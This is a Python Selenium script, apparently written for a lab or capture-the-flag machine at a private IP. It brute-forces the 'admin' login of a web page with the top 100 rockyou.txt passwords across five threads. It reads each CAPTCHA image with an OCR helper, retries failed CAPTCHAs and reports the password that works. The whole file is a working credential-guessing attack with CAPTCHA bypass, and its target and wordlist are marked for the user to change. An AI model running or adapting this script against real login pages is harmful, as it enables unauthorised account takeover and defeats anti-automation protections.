from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import os
import time
from process import read_captcha
from concurrent.futures import ThreadPoolExecutor
import threading

url = "http://10.10.22.245/index.php" #CHANGE THIS
wordlist = "/usr/share/wordlists/rockyou.txt" #CHANGE THIS
username = "admin"
password = []
found_password_event = threading.Event()
foundPassword = ""

with open(wordlist, "r") as f:
	for lines in range(100):
		password.append(next(f).strip())

def bruteforce(pwd):
	if found_password_event.is_set(): # Check if password already found by another thread
        		return
	global foundPassword
	options = Options()
	options.add_argument("--headless")
	options.add_argument("start-maximized")
	driver = webdriver.Chrome(options=options)
	while True:
		driver.get(url)
		time.sleep(1.5) #Must sleep for 1.5 due to animation of page that lasts 1s
		elemUserInput = driver.find_element(By.ID, "username")
		elemPassInput = driver.find_element(By.ID, "password")
		elemCaptchaInput = driver.find_element(By.ID, "captcha_input")
		elemSubmit = driver.find_element(By.ID, "login-btn")
		captcha_img_element = driver.find_element(By.TAG_NAME, "img")
		captcha_png = captcha_img_element.screenshot_as_png
		captcha_text = read_captcha(captcha_png)
		elemUserInput.send_keys(username)
		elemPassInput.send_keys(pwd)
		elemCaptchaInput.send_keys(captcha_text)
		elemSubmit.click()
		time.sleep(2.5)
		if (url in driver.current_url): #Check for redirection if successful
			try:
				elemErrors = driver.find_element(By.ID, "error-box")
				if "incorrect" in elemErrors.text: #Check for incorrect CAPTCHA
					print("\033[91m {}\033[00m".format(f"[ERR]: CAPTCHA INCORRECT RETRYING {pwd} AGAIN!"))	
				else: 
					print("\033[91m {}\033[00m".format(f"[-] Login failed with password: {pwd}"))
					break
			except Exception as e:
				print(e)
		else:
			print("\033[92m {}\033[00m".format(f"[+] LOGIN SUCCESS WITH PASSWORD: {pwd}"))
			print("\033[92m {}\033[00m".format(f"[+] WAITING FOR ALL THREADS TO FINISH EXECUTING!"))
			foundPassword = pwd
			found_password_event.set()
			break
	driver.quit()
	

if __name__ =="__main__":
	with ThreadPoolExecutor(max_workers=5) as executor:
		for pwd in password:
			print(f"Trying Password: {pwd}")
			executor.submit(bruteforce, pwd)
	print("\033[92m {}\033[00m".format(f"DONE! PASSWORD: {foundPassword}"))
			
	
